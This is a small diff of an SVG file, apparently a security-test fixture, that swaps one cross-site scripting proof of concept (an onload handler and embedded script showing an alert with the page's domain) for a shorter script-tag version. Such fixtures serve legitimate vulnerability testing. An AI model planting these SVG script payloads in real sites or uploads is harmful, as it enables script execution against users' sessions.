@@ -1,9 +1,1 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="420" height="120"
-     onload="try{alert('F2 svgz onload XSS on '+document.domain)}catch(e){};document.title='XSS-SVGZ'">
-  <script type="application/ecmascript">//<![CDATA[
-    try { alert('F2 svgz script XSS on ' + document.domain); } catch (e) {}
-  //]]></script>
-  <rect width="420" height="120" fill="#fee"/>
-  <text x="12" y="64" fill="#c00" font-size="18">F2 .svgz XSS executed</text>
-</svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
